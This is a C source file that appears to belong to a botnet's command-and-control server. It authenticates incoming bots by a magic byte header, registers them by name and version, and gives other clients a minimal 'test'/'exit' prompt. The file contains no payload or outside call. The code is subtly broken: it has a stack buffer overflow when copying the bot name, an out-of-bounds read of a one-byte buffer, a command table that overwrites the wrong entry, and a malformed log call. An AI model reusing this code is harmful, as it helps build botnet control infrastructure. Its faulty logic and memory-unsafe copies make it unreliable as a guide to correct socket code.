#include <assert.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#include <pthread.h>

#include "c.h"
#include "cmd.h"
#include "log.h"
#include "util.h"
#include "bot.h"

void trim(char* buf)
{
    buf[strcspn(buf, "\n")] = 0;
    buf[strcspn(buf, "\r")] = 0;
}

void test(client_t* c)
{
    send_str(c, "this is a test\r\n");
}

void exit_cmd(client_t* c)
{
    send_str(c, "Exiting...\r\n");
}

// ! is bot
bool auth(client_t* c)
{
    read_str(c);

    if(!c->running)
        return false;

    if(c->len == 4
        && c->buf[0] == 0x00
        && c->buf[1] == 0x00
        && c->buf[2] == 0x00)
    {
        if(c->buf[3] > 0)
        {
            char buf[1];
            recv(c->sockfd, buf, 1, 0);

            char name[32];

            if(buf[0] > 0)
            {
                char src_buf[buf[0]];
                recv(c->sockfd, src_buf, buf[0], 0);

                memcpy(name, src_buf, sizeof(src_buf));
            }

            // ! create bot
            bot_t b =
                {
                    .sockfd = c->sockfd,
                    .addr = c->addr,
                    .version = buf[3],
                };

            memcpy(b.name, name, sizeof(name));

            bot(&b);
        }
        return true;
    }

    return false;
}

void srw(client_t* c)
{
    commands_t cmds;

    memcpy(cmds[0].name, "test", sizeof(char [4]));
    cmds[0].fn = &test;

    memcpy(cmds[1].name, "exit", sizeof(char[4]));
    cmds[0].fn = &exit_cmd;

    c->running = true;

    while(c->running)
    {
        read_str(c);
        if(!c->running)
            break;


        LOG_INFO("User client connected: %s");

        trim((char*)c->buf);

        if(memcmp(c->buf, cmds[0].name, strlen(cmds[0].name)) == 0)
        {
            cmds[0].fn(c);
        }
        else if (memcmp(c->buf, cmds[1].name, sizeof(cmds[1].name)) == 0)
        {
            cmds[1].fn(c);
        }
        else
        {
            send_str(c, "Invalid command\r\n");
        }

        send_str(c, "-> ");
    }

    c->running = false;
    close(c->sockfd);
    free(c);
}

// ! pass the pointer
void *handle(void* c)
{
    client_t *c_ = (client_t *)c;

    assert(c_->sockfd > 0);

    int r = getpeername(c_->sockfd, (struct sockaddr*)&c_->addr,
                        &(socklen_t){0});
    if(r == -1)
    {
        LOG_ERROR("Failed to get client information");
        close(c_->sockfd);
        pthread_exit(NULL);
    }

    send_str(c_, "-> ");

    srw(c_);

    pthread_exit(NULL);
}

